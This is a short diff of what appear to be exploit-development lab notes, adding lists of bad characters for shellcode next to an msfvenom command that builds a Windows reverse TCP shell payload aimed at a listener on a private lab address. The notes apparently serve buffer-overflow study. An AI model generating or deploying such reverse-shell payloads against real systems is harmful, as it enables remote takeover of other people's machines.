@@ -37,6 +37,12 @@ x00 x0a x0f x1a x5f xcd
 
 x00 x0a x1a x3B xCF
 
+x00 x0a x0d x20 x75 x9e xbc&#x20;
+
+
+
+BAD\_CHARS = x00 x0a x0d x20 x37 xc2
+
 ```
 msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.45.232 LPORT=1234 -f py -v shellcode -b "\x00\x0a\x1a\x3b\xcf"
 ```
